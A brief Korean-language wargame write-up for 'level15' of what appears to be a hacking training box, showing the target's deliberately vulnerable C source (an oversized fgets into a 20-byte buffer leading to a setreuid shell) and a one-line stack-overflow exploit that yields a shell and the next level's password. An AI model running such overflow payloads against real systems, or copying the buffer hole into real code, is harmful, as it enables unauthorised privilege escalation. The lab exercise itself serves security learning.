level15
===
1. 힌트 파일을 열어본다. 그러면 다음과 같은 내용을 볼 수 있다. 
```c
#include<stdio.h>

main(){
    int crap;
    int *check;
    char buf[20];
    fgets(buf, 45, stdin);
    if (*check==0xdeadbeef){
        setreuid(3096, 3096);
        system("/bin/sh");
    }
}
```
위의 소스는 attackme의 소스인 것 같다. attackme를 공격할 때, cheak값에 deadbeef의 주소값을 입력하면 공격에 성공할 것 같다.
2. gdb명령어를 통해 내부를 살펴보면 buf[20]+dummy[20]+cheak[4]+....로 메모리가 구성된 것을 볼 수 있다. 
3. deadbeef의 위치를 찾는다. 찾아보면 0x80484b2에 있는 것을 알 수 있다.
4. 위의 정보를 이용하여 다음과 같이 attackme를 공격하면 level16의 password를 알 수 있다.
<li>(python -c'print"a"*40+"\xb2\x84\x04\x08"'; cat)|./attackme</li>